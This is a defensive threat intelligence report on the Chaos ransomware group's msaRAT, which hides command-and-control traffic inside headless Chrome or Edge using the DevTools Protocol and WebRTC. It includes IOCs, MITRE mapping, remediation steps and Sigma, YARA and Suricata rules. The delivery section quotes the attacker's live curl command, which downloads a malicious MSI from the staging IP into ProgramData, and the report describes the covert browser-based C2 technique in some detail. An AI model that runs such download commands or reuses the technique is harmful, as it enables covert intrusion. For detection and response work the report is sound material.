# Technical Analysis Report: Chaos Ransomware msaRAT (2026-07-25)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-25
Version: 1.1 (FINAL)
<!-- revision: v1.1 — applied critic verdicts: narrowed Sigma Rule 1 parent to msiexec only; added update_ms.msi filename constraint to Sigma Rule 2; added TLS/HTTPS caveat and companion tls.sni rule to Suricata Rule 3; reworded remediation item 4 re: WebRTC monitoring scope. -->

## Executive Summary

The Chaos ransomware group has deployed a novel Rust-based remote access trojan (RAT) dubbed "msaRAT" that establishes covert command-and-control communications by hijacking the victim's Chrome or Edge browser through the Chrome DevTools Protocol (CDP). First attributed to the Chaos RaaS operation that surfaced in February 2025, the msaRAT never makes direct outbound network connections; instead, it launches a headless browser instance, injects JavaScript via CDP, and builds a WebRTC DataChannel relayed through Cloudflare Workers (for signaling) and Twilio TURN servers (for data transport). The result is a C2 channel that appears as legitimate browser traffic originating from a trusted process, evading protocol-based egress controls and network-layer detection. The malware is delivered as an MSI installer masquerading as a Windows update, uses dual-layer encryption (DTLS + ChaCha-Poly1305 with ECDH key exchange), and confines its own network activity to localhost (127.0.0.1).

## Background: Chrome DevTools Protocol as Attack Surface

The Chrome DevTools Protocol (CDP) is a debugging and instrumentation interface built into Chromium-based browsers (Chrome, Edge, Brave, etc.). When a browser is launched with the `--remote-debugging-port` flag, it exposes a WebSocket-based API on localhost that allows full programmatic control of browser tabs, JavaScript execution, network interception, and DOM manipulation. While CDP is essential for legitimate browser automation (Puppeteer, Playwright, Selenium), its capabilities make it a powerful post-exploitation channel when abused by malware. The msaRAT represents the first documented case of a ransomware-affiliated threat actor using CDP not just for credential theft or session hijacking but to construct an entire C2 communication channel through the browser's own network stack.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2025-02 | Chaos ransomware group first observed operating RaaS platform |
| 2026-07-22 | Cisco Talos publishes detailed technical analysis of msaRAT |
| 2026-07-23 | Multiple security vendors confirm and report on msaRAT findings |

## Root Cause: Malicious MSI Delivery via curl

The initial access vector involves downloading a malicious MSI installer via curl.exe:

```
curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi
```

Notable aspects of this delivery:
- Uses HTTP (not HTTPS) despite connecting to port 443, potentially evading TLS inspection
- The MSI is saved to `C:\ProgramData\`, a writable directory for all users
- MSI properties are configured to impersonate a legitimate Windows update package

## Technical Analysis of the Malicious Payload

### 1. MSI Installer and DLL Loader

The MSI installer (`update_ms.msi`) contains the RAT payload embedded in the MSI Binary table under the entry name `Bin_lib_EA2AEBC3`. The payload is a DLL (`lib.dll`) that is loaded directly into memory from the Binary table -- never written to disk as a standalone file. A custom action named `CA_Run_EA2AEBC3` is configured to execute after `InstallFinalize`, which loads the DLL and calls its exported `RUN` function.

### 2. Browser Discovery and Launch

Upon execution, msaRAT searches for an installed Chromium-based browser through two methods:
1. **Environment variables** (priority): Checks standard program paths
2. **Registry lookup** (fallback): Queries `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths` for Chrome/Edge installations

The RAT then launches the discovered browser using `CreateProcessW` with specific command-line flags:
- `--headless=new` -- runs browser without visible UI
- `--remote-debugging-port` -- enables CDP WebSocket endpoint
- `--user-data-dir` -- specifies a custom profile directory to avoid conflicts

### 3. C2 Infrastructure

**Chrome DevTools Protocol (CDP) Channel:**
1. Connects to the browser's `/json/list/` endpoint to obtain `webSocketDebuggerUrl`
2. Establishes WebSocket connection to the debugging URL
3. Sends CDP commands: `Target.createTarget`, `Page.enable`, `Runtime.enable`
4. Calls `Page.setBypassCSP` to disable Content Security Policy in the controlled tab
5. Registers five binding callbacks via CDP: `msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`
6. Injects JavaScript payloads via `Runtime.evaluate` for all subsequent C2 operations

**WebRTC DataChannel Establishment:**
1. Injected JavaScript sends GET request to `https://is-01-ast.ols-img-12.workers.dev/token/v1/{UID}` to retrieve ICE server configuration (STUN/TURN credentials)
2. Creates `RTCPeerConnection` with retrieved ICE servers (STUN: `stun2.l.google.com`, TURN: `global.turn.twilio.com`)
3. Opens a DataChannel with a random alphanumeric name (5-20 characters)
4. Generates SDP Offer, gathers ICE candidates (5-second timeout)
5. POSTs SDP Offer to `/token/v1/{UID}` on the Cloudflare Workers endpoint
6. Receives SDP Answer -- the response intentionally omits ICE candidates, forcing all traffic through the Twilio TURN relay server
7. Cloudflare Workers drops out of the communication path after WebRTC handshake completes

**Spoofed HTTP Headers:**
The JavaScript injects spoofed `Origin` and `Referer` headers impersonating Microsoft official websites when communicating with the Cloudflare Workers endpoint.

**Data Flow:**
- All data passes through the browser via `Runtime.evaluate` CDP commands
- Base64 encoding is used for binary-to-string conversion for CDP string transmission
- A send queue with 24KB buffer threshold provides flow control
- All external network traffic originates from the legitimate browser process (chrome.exe/msedge.exe)
- The msaRAT process itself communicates only with 127.0.0.1

### 4. Platform-Specific Behavior

#### Windows (Only Known Target)

- **Delivery:** MSI installer via curl.exe to `C:\ProgramData\`
- **Payload:** lib.dll loaded in-memory from MSI Binary table
- **Runtime:** Rust binary using Tokio asynchronous runtime
  - Checks `TOKIO_WORKER_THREADS` environment variable for thread count
  - Falls back to `GetSystemInfo` / `dwNumberOfProcessors`
  - Creates OS threads via `CreateThread` API
- **Persistence:** Via MSI installation (remains installed as a "Windows update")
- **Browser targeting:** Chrome and Edge on Windows

### 5. Anti-Forensics / Evasion Techniques

- **Living off the Browser (LOB):** All external C2 traffic exits through a legitimate browser process, not the malware process itself
- **In-memory DLL loading:** lib.dll is never written to disk as a standalone file; loaded directly from MSI Binary table
- **Dual-layer encryption:**
  - Layer 1: DTLS -- automatically applied by WebRTC DataChannel (handled by browser)
  - Layer 2: ChaCha-Poly1305 application-level encryption with ECDH key exchange
  - Handshake frame (0xFE) initiates public key exchange
- **Localhost-only RAT traffic:** msaRAT process network activity confined to 127.0.0.1
- **Content Security Policy bypass:** `Page.setBypassCSP` disables browser security controls
- **TURN relay forcing:** Omitting ICE candidates in SDP Answer forces all traffic through relay, ensuring the attacker's IP never appears in network logs
- **Legitimate infrastructure abuse:** Cloudflare Workers and Twilio TURN servers are trusted services that are unlikely to be blocked
- **MSI masquerading:** Installer properties mimic a legitimate Windows update

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxp://` replacing `http://`
> - Domains: `[.]` replacing dots
> - IP addresses: `[.]` replacing dots

### File System

| Platform | Path | Description |
|----------|------|-------------|
| Windows | `C:\ProgramData\update_ms.msi` | MSI installer dropped by curl |
| Windows | (in-memory) `lib.dll` | RAT DLL payload loaded from MSI Binary table |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | `172[.]86[.]126[.]18:443` | Staging server hosting MSI installer (HTTP on port 443) |
| Domain | `is-01-ast[.]ols-img-12[.]workers[.]dev` | Cloudflare Workers endpoint for WebRTC signaling relay |
| STUN Server | `stun2[.]l[.]google[.]com` | Google STUN server used for ICE candidate gathering |
| TURN Server | `global[.]turn[.]twilio[.]com` | Twilio TURN relay for WebRTC DataChannel transport |
| URL Pattern | `hxxps://is-01-ast[.]ols-img-12[.]workers[.]dev/token/v1/{UID}` | ICE server config retrieval and SDP exchange endpoint |
| URL Pattern | `hxxp://172[.]86[.]126[.]18:443/update_ms[.]msi` | MSI installer download URL |

### Behavioral

- Chrome or Edge process launched with `--headless=new`, `--remote-debugging-port`, and `--user-data-dir` flags by a non-interactive parent (msiexec.exe)
- Loopback WebSocket connections to browser debugging port (`/json/list/` endpoint)
- CDP binding registrations for names: `msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`
- Browser process making outbound connections to `*.workers.dev` and `global.turn.twilio.com` without user interaction
- MSI custom action loading DLL from Binary table entry `Bin_lib_EA2AEBC3`

### Detection Signatures (Vendor)

| Vendor | Signature |
|--------|-----------|
| ClamAV | `Win.Downloader.ChaosRaas-10060321-0` |
| Snort 2 | SIDs 1:66839, 1:66840, 1:66841 |
| Snort 3 | SIDs 1:66839, 1:301587 |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1218.007 | System Binary Proxy Execution: Msiexec | MSI installer executed via msiexec triggers malicious custom action to load lib.dll |
| T1105 | Ingress Tool Transfer | curl.exe downloads malicious MSI from staging server to C:\ProgramData\ |
| T1036.005 | Masquerading: Match Legitimate Name or Location | MSI properties configured to impersonate a legitimate Windows update |
| T1106 | Native API | Uses CreateProcessW to launch browser, CreateThread for Tokio runtime threads |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Injects JavaScript via CDP Runtime.evaluate for WebRTC channel construction |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 signaling via HTTPS to Cloudflare Workers endpoint |
| T1572 | Protocol Tunneling | WebRTC DataChannel tunneled through browser process for C2 communications |
| T1102.002 | Web Service: Bidirectional Communication | Cloudflare Workers used as bidirectional signaling relay |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Dual-layer encryption with DTLS and ChaCha-Poly1305 |
| T1090.002 | Proxy: External Proxy | Twilio TURN server used as relay to mask attacker infrastructure |

## Impact Assessment

**Breadth:** msaRAT targets any Windows environment with Chrome or Edge installed, which encompasses the vast majority of enterprise endpoints. The Chaos RaaS model means multiple affiliate groups may deploy this tool.

**Depth:** Full remote access capability through the C2 channel, enabling arbitrary command execution, data exfiltration, and ransomware deployment. The in-memory DLL loading and browser-based C2 make forensic recovery more difficult.

**Stealth:** Exceptionally high. The C2 channel is nearly invisible to traditional network monitoring because (1) all traffic exits from a trusted browser process, (2) destinations are legitimate cloud services (Cloudflare, Twilio, Google), (3) the protocol (WebRTC/DTLS) is indistinguishable from video conferencing or collaborative web applications, and (4) the RAT process itself has no external network footprint.

## Detection & Remediation

### Immediate Detection

1. **Hunt for suspicious browser launches:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} |
  Where-Object { $_.Properties[4].Value -match '(chrome|msedge)\.exe' -and
                 $_.Message -match '--remote-debugging-port' -and
                 $_.Message -match '--headless' }
```

2. **Check for known IOC IP connection:**
```powershell
Get-NetTCPConnection -RemoteAddress 172.86.126.18 -ErrorAction SilentlyContinue
```

3. **Search for staged MSI installer:**
```powershell
Get-ChildItem -Path C:\ProgramData\ -Filter "update_ms.msi" -Recurse -ErrorAction SilentlyContinue
```

4. **Check DNS logs for C2 domain:**
```
dns.query contains "is-01-ast.ols-img-12.workers.dev"
```

### Remediation

1. **Containment:** Isolate affected endpoints from the network immediately
2. **Process termination:** Kill suspicious headless browser instances and the parent msaRAT process
3. **MSI removal:** Uninstall the malicious MSI package and delete `C:\ProgramData\update_ms.msi`
4. **Browser profile cleanup:** Remove any custom browser profile directories created by the RAT
5. **Network blocking:** Block `172.86.126.18` at the perimeter and add `is-01-ast.ols-img-12.workers.dev` to DNS sinkholes
6. **Credential rotation:** Rotate credentials for any accounts active on compromised endpoints
7. **Full forensic investigation:** Analyze MSI installer and DLL for additional capabilities; check for lateral movement

### Long-Term Hardening

1. **Chrome Enterprise Policy:** Disable `--remote-debugging-port` via Group Policy for non-developer endpoints (`DevToolsAvailability` = 2)
2. **Application Control:** Implement WDAC/AppLocker policies to restrict which processes can launch browsers with debugging flags
3. **Sysmon Configuration:** Ensure Sysmon Event ID 1 (process creation) captures full command lines, especially for browser processes
4. **WebRTC Monitoring:** Monitor for WebRTC traffic originating from headless or background browser instances without user interaction -- this is the anomalous pattern, not WebRTC in general (which is required for Teams, Meet, Slack, and other collaboration tools)
5. **MSI Audit Logging:** Enable Windows Installer logging to detect suspicious custom action execution

## Detection Rules

These rules cover three detection layers: behavioral process execution patterns (4 Sigma rules), file-level malware identification (2 YARA rules), and network-level indicators (4 Suricata rules, including a TLS SNI companion for HTTPS endpoints). The primary caveat is that the behavioral Sigma rule for browser debugging flags is scoped to msiexec.exe as parent -- the sole documented parent in the Talos analysis. All Sigma rules were validated via `sigma convert` to Splunk and LogScale backends; `sigma check` could not complete due to an environment-level proxy restriction on MITRE ATT&CK data fetching (not a rule syntax issue).

### Sigma: Browser Launched with Remote Debugging by Msiexec - msaRAT Pattern

<!-- revision: v1.1 — narrowed parent list from 8 entries to msiexec.exe only, per documented execution chain. Title updated to reflect scope. -->

Detects Chrome or Edge launched with headless and remote debugging flags by msiexec.exe, matching the documented msaRAT execution chain where a malicious MSI custom action launches a headless browser for C2.

compile-status: `sigma convert` to Splunk and LogScale: **pass** | confidence: **medium**

<!-- audit: validated via sigma convert --without-pipeline -t splunk and -t log_scale (exit 0). sigma check failed due to proxy blocking MITRE ATT&CK STIX data download (environment issue, not rule syntax). Tags attack.t1218.007, attack.t1071.001, attack.t1572 are valid MITRE sub/technique IDs. logsource category:process_creation product:windows is standard. Field names Image, CommandLine, ParentImage match Sysmon EID 1 schema. Values use real paths (backslash-terminated endswith), not defanged. FP risk: browser test automation (Playwright, Puppeteer) launched by MSI-installed services (uncommon). Parent restricted to msiexec.exe only — the sole documented parent in the Talos analysis. -->

```yaml
title: Browser Launched with Remote Debugging by Msiexec - msaRAT Pattern
id: 8f3a7c1e-4d2b-4e9a-b5f6-1c8d9e0a2b3c
status: experimental
description: >
    Detects Chrome or Edge browsers launched with remote debugging flags and headless mode
    by msiexec.exe. This pattern matches the msaRAT execution chain where a malicious MSI
    installer launches a headless browser to establish a covert C2 channel via Chrome
    DevTools Protocol. Only msiexec.exe is used as the parent filter because it is the sole
    documented parent in the Chaos msaRAT execution chain.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/25
tags:
    - attack.t1218.007
    - attack.t1071.001
    - attack.t1572
logsource:
    category: process_creation
    product: windows
detection:
    selection_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
    selection_flags:
        CommandLine|contains|all:
            - '--remote-debugging-port'
            - '--headless'
    selection_parent:
        ParentImage|endswith: '\msiexec.exe'
    condition: selection_browser and selection_flags and selection_parent
falsepositives:
    - Automated browser testing frameworks launched via MSI-deployed services
level: high
```

### Sigma: Curl Download of msaRAT MSI Installer to ProgramData Directory

<!-- revision: v1.1 — added update_ms.msi filename constraint as fourth AND condition to reduce false positives from generic curl+MSI admin scripts. -->

Detects curl.exe downloading the specific msaRAT MSI file (`update_ms.msi`) to C:\ProgramData\, matching the documented delivery mechanism.

compile-status: `sigma convert` to Splunk and LogScale: **pass** | confidence: **medium**

<!-- audit: validated via sigma convert --without-pipeline -t splunk and -t log_scale (exit 0). Tags attack.t1105, attack.t1036.005 are valid. logsource process_creation/windows standard. Fields Image, CommandLine match Sysmon EID 1. Detection uses real backslash paths, not defanged. Added update_ms.msi filename filter to narrow from generic curl+MSI to the known artifact. FP risk: low — requires exact filename match in addition to curl, ProgramData path, and -o flag. -->

```yaml
title: Curl Download of msaRAT MSI Installer to ProgramData Directory
id: a2b4c6d8-e1f3-4a5b-8c7d-9e0f1a2b3c4d
status: experimental
description: >
    Detects curl.exe downloading the msaRAT MSI installer (update_ms.msi) to the
    C:\ProgramData directory. This matches the specific delivery mechanism used by
    the Chaos ransomware group to stage the malicious MSI disguised as a Windows update.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/25
tags:
    - attack.t1105
    - attack.t1036.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_curl:
        Image|endswith: '\curl.exe'
    selection_msi:
        CommandLine|contains: '.msi'
    selection_path:
        CommandLine|contains|all:
            - '-o'
            - '\programdata\'
    selection_filename:
        CommandLine|contains: 'update_ms.msi'
    condition: selection_curl and selection_msi and selection_path and selection_filename
falsepositives:
    - Unlikely - matches the specific msaRAT installer filename
level: high
```

### Sigma: DNS Query to msaRAT Cloudflare Workers C2 Domain

Detects DNS resolution of the specific Cloudflare Workers subdomain used by msaRAT for WebRTC signaling.

compile-status: `sigma convert` to Splunk and LogScale: **pass** | confidence: **high**

<!-- audit: validated via sigma convert --without-pipeline -t splunk and -t log_scale (exit 0). Tag attack.t1071.001, attack.t1102.002 valid. logsource dns_query standard (Sysmon EID 22). Field QueryName standard Sysmon DNS field. Value uses real domain (is-01-ast.ols-img-12.workers.dev), not defanged. IOC-specific rule, low FP. endswith used because QueryName may include trailing dot or subdomain prefix. -->

```yaml
title: DNS Query to msaRAT Cloudflare Workers C2 Domain
id: c4d6e8f0-1a3b-5c7d-9e0f-2a4b6c8d0e1f
status: experimental
description: >
    Detects DNS resolution of the Cloudflare Workers domain used by the Chaos ransomware
    group's msaRAT for WebRTC signaling relay. The domain is-01-ast.ols-img-12.workers.dev
    serves as the SDP offer/answer exchange endpoint during C2 channel establishment.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/25
tags:
    - attack.t1071.001
    - attack.t1102.002
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: 'is-01-ast.ols-img-12.workers.dev'
    condition: selection
falsepositives:
    - Unlikely - this is a specific attacker-controlled Cloudflare Workers subdomain
level: critical
```

### Sigma: Network Connection to msaRAT Staging Server

Detects outbound network connections to the known msaRAT staging IP address.

compile-status: `sigma convert` to Splunk and LogScale: **pass** | confidence: **high**

<!-- audit: validated via sigma convert --without-pipeline -t splunk and -t log_scale (exit 0). Tag attack.t1105 valid. logsource network_connection standard (Sysmon EID 3). Field DestinationIp standard Sysmon field. Value uses real IP 172.86.126.18, not defanged. IOC-specific, low FP risk. IP may be reassigned over time — monitor for decommissioning. -->

```yaml
title: Network Connection to msaRAT Staging Server
id: 7e9b1d3f-5a2c-4f8e-b6d0-3c7a9e1f4b5d
status: experimental
description: >
    Detects network connections to the known msaRAT staging IP address 172.86.126.18 used
    by the Chaos ransomware group to host the malicious MSI installer. The initial download
    uses HTTP on port 443 to this IP.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/25
tags:
    - attack.t1105
logsource:
    category: network_connection
detection:
    selection:
        DestinationIp: '172.86.126.18'
    condition: selection
falsepositives:
    - Unlikely - known malicious infrastructure
level: critical
```

### YARA: Chaos msaRAT DLL Payload

Detects the msaRAT DLL payload via characteristic CDP binding names, Tokio runtime strings, and WebRTC signaling artifacts found in the Rust-compiled binary.

compile-status: `yarac` exit 0: **pass** | confidence: **medium**

<!-- audit: validated via yarac chaos-msarat.yar /dev/null (exit 0). PE header check (MZ magic) constrains to Windows executables. Size limit 10MB reasonable for Rust binary. Core detection anchored on CDP binding names (msaOpen, msaClose, msaError, msaMessage, dataAck) which are unique to this malware family. Tokio strings are generic but combined with bindings provide specificity. No sample hashes available from Talos at time of writing. FP risk: low for 3-of-5 binding match; medium if only 2 bindings matched with CDPs. -->

```yara
import "pe"

rule Malware_Chaos_msaRAT_DLL
{
    meta:
        description = "Detects the msaRAT DLL payload used by the Chaos ransomware group. Matches characteristic CDP binding names, Tokio runtime strings, and WebRTC signaling artifacts found in the Rust-compiled lib.dll."
        author = "Actioner"
        date = "2026-07-25"
        reference = "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/"
        tlp = "WHITE"
        severity = "critical"

    strings:
        // CDP binding names unique to msaRAT
        $bind1 = "msaOpen" ascii wide
        $bind2 = "msaClose" ascii wide
        $bind3 = "msaError" ascii wide
        $bind4 = "msaMessage" ascii wide
        $bind5 = "dataAck" ascii wide

        // Tokio runtime strings in Rust binary
        $tokio1 = "TOKIO_WORKER_THREADS" ascii
        $tokio2 = "the number of hardware threads is not known for the target platform" ascii

        // CDP commands used by the RAT
        $cdp1 = "Target.createTarget" ascii
        $cdp2 = "Page.setBypassCSP" ascii
        $cdp3 = "Runtime.evaluate" ascii
        $cdp4 = "Page.enable" ascii
        $cdp5 = "Runtime.enable" ascii

        // WebRTC/signaling strings
        $webrtc1 = "RTCPeerConnection" ascii wide
        $webrtc2 = "/token/v1/" ascii
        $webrtc3 = "workers.dev" ascii

        // Encryption identifiers
        $enc1 = "chacha20" ascii nocase
        $enc2 = "poly1305" ascii nocase

    condition:
        uint16(0) == 0x5A4D and
        filesize < 10MB and
        (
            (3 of ($bind*)) or
            (2 of ($bind*) and 2 of ($cdp*)) or
            (2 of ($bind*) and 1 of ($tokio*) and 1 of ($webrtc*)) or
            (2 of ($bind*) and 1 of ($enc*) and 1 of ($cdp*))
        )
}
```

### YARA: Chaos msaRAT MSI Installer

Detects the malicious MSI installer used to deliver msaRAT via Binary table entry name and custom action identifiers.

compile-status: `yarac` exit 0: **pass** | confidence: **medium**

<!-- audit: validated via yarac chaos-msarat.yar /dev/null (exit 0). OLE/CF header check (D0 CF 11 E0) constrains to MSI/OLE files. Binary table entry Bin_lib_EA2AEBC3 and custom action CA_Run_EA2AEBC3 are highly specific to this campaign. RUN export alone is too generic but combined with MSI-specific identifiers is reliable. Size limit 50MB generous for MSI. FP risk: very low given specificity of Binary table entry names. -->

```yara
rule Malware_Chaos_msaRAT_MSI_Installer
{
    meta:
        description = "Detects malicious MSI installer used to deliver the msaRAT payload. Matches the Binary table entry name and DLL export function used during custom action execution."
        author = "Actioner"
        date = "2026-07-25"
        reference = "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/"
        tlp = "WHITE"
        severity = "high"

    strings:
        // MSI Binary table entry name
        $msi1 = "Bin_lib_EA2AEBC3" ascii wide
        // Custom action name
        $msi2 = "CA_Run_EA2AEBC3" ascii wide
        // Export function
        $msi3 = "RUN" ascii fullword

        // MSI magic header
        $msi_header = { D0 CF 11 E0 A1 B1 1A E1 }

    condition:
        $msi_header at 0 and
        filesize < 50MB and
        (
            ($msi1 and $msi3) or
            ($msi2 and $msi3) or
            ($msi1 and $msi2)
        )
}
```

### Suricata: DNS Query to msaRAT C2 Signaling Domain

Detects DNS queries for the Cloudflare Workers domain used by msaRAT for WebRTC signaling.

compile-status: **uncompiled (structural check only)** | confidence: **high**

<!-- audit: structural check only (Suricata not installed). Protocol dns enables dns.query sticky buffer. flow:to_server correct for client query. content uses real domain (not defanged). nocase applied for case-insensitive DNS matching. fast_pattern on most specific label. All options semicolon-terminated. sid/rev/msg present. Dot-notation buffers used (Suricata, not Snort underscore). -->

```
alert dns $HOME_NET any -> any any (
    msg:"Actioner - DNS Query to msaRAT Cloudflare Workers C2 Domain";
    flow:to_server;
    dns.query;
    content:"is-01-ast.ols-img-12.workers.dev"; nocase; fast_pattern;
    classtype:trojan-activity;
    reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/;
    metadata:author Actioner, created_at 2026-07-25;
    sid:2100010;
    rev:1;
)
```

### Suricata: HTTP Request to msaRAT Staging Server for MSI Download

Detects HTTP requests to the known msaRAT staging IP for MSI installer download.

compile-status: **uncompiled (structural check only)** | confidence: **high**

<!-- audit: structural check only (Suricata not installed). Protocol http enables http.uri sticky buffer. flow:established,to_server correct for client request. content matches real URI path (not defanged). Destination IP 172.86.126.18 in header. http.method for GET. Port 443 specified per observed behavior (HTTP on 443). All options semicolon-terminated. Dot-notation buffers used. -->

```
alert http $HOME_NET any -> 172.86.126.18 443 (
    msg:"Actioner - HTTP Request to msaRAT Staging Server for MSI Download";
    flow:established,to_server;
    http.method;
    content:"GET";
    http.uri;
    content:"/update_ms.msi"; fast_pattern;
    classtype:trojan-activity;
    reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/;
    metadata:author Actioner, created_at 2026-07-25;
    sid:2100011;
    rev:1;
)
```

### Suricata: HTTP Request to msaRAT WebRTC Signaling Endpoint

<!-- revision: v1.1 — added prominent HTTPS/TLS caveat: the target endpoint uses HTTPS, so alert http with http.host/http.uri buffers requires TLS decryption. Added companion alert tls rule (sid:2100013) matching tls.sni for non-decrypting environments. -->

Detects HTTP traffic to the Cloudflare Workers `/token/v1/` endpoint used for WebRTC SDP exchange. **Important: the target endpoint (`https://is-01-ast.ols-img-12.workers.dev`) uses HTTPS. This rule requires TLS decryption/inspection to function.** In environments without TLS decryption, use the companion `alert tls` rule (sid:2100013) below, or rely on sid:2100010 (DNS query rule) which covers the same domain at the DNS layer without requiring decryption.

compile-status: **uncompiled (structural check only)** | confidence: **medium**

<!-- audit: structural check only (Suricata not installed). IMPORTANT: the target Cloudflare Workers endpoint uses HTTPS — alert http with http.host/http.uri sticky buffers will only match if TLS traffic is decrypted upstream (SSL/TLS inspection proxy, or Suricata configured with TLS decryption). Without decryption, these buffers are empty for HTTPS flows. Companion alert tls rule (sid:2100013) provided for non-decrypting deployments. Protocol http enables http.uri and http.host sticky buffers (post-decryption). flow:established,to_server correct. content matches real URI path /token/v1/ (not defanged). http.host matches real domain. All options semicolon-terminated. Dot-notation used. FP risk: other applications using same Workers subdomain pattern (unlikely given specificity). -->

```
# Requires TLS decryption — see sid:2100013 for non-decrypting alternative
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Actioner - HTTP Request to msaRAT WebRTC Signaling Endpoint (requires TLS decryption)";
    flow:established,to_server;
    http.host;
    content:"is-01-ast.ols-img-12.workers.dev"; fast_pattern;
    http.uri;
    content:"/token/v1/";
    classtype:trojan-activity;
    reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/;
    metadata:author Actioner, created_at 2026-07-25;
    sid:2100012;
    rev:2;
)

# Companion rule for environments without TLS decryption — matches on TLS SNI
alert tls $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Actioner - TLS Connection to msaRAT WebRTC Signaling Domain (non-decrypting)";
    flow:established,to_server;
    tls.sni;
    content:"is-01-ast.ols-img-12.workers.dev"; fast_pattern;
    classtype:trojan-activity;
    reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/;
    metadata:author Actioner, created_at 2026-07-25;
    sid:2100013;
    rev:1;
)
```

## Lessons Learned

1. **Browser-as-C2-proxy is a blind spot:** Traditional network security tools that inspect traffic by protocol, port, or process reputation will miss C2 channels that route through legitimate browser processes to trusted cloud infrastructure. Defenders need to monitor the *how* of browser launches (command-line arguments, parent process), not just the *what* of browser network traffic.

2. **Chrome DevTools Protocol requires enterprise governance:** CDP is a powerful API that most security teams do not monitor or restrict. Organizations should treat `--remote-debugging-port` on production endpoints the same way they treat other high-risk debugging interfaces -- disabled by policy, monitored by detection, and investigated on sight.

3. **Legitimate infrastructure abuse accelerates:** The combination of Cloudflare Workers (for signaling), Twilio TURN (for relay), and Google STUN (for discovery) creates a C2 channel built entirely from reputable cloud services. Blocking by destination IP or domain is insufficient; behavioral detection at the endpoint layer is essential.

4. **MSI as an evasion vector:** The in-memory DLL loading from the MSI Binary table (never touching disk as a standalone file) bypasses file-based scanning. MSI custom actions deserve the same scrutiny as script-based execution vectors.

## Sources

- [Cisco Talos Blog - Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel](https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/) -- primary technical analysis with full execution chain and C2 architecture
- [BleepingComputer - New msaRAT malware uses Chrome, Edge browsers to route C2 traffic](https://www.bleepingcomputer.com/news/security/new-msarat-malware-uses-chrome-edge-browsers-to-route-c2-traffic/amp/) -- coverage of Chrome command-line flags and IOC GitHub reference
- [The Hacker News - Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and Edge](https://thehackernews.com/2026/07/chaos-ransomware-uses-msarat-to-route.html) -- additional context on detection signatures and hunting indicators
- [Security Affairs - Chaos ransomware deploys browser-based msaRAT to evade network detection](https://securityaffairs.com/195876/malware/chaos-ransomware-deploys-browser-based-msarat-to-evade-network-detection.html) -- supplementary IOCs and detection recommendations
- [Cisco Talos IOCs GitHub - chaos-msarat.txt](https://github.com/Cisco-Talos/IOCs/blob/main/2026/07/chaos-msarat.txt) -- official IOC list (IP and domain indicators)

---
*Report generated by Actioner*
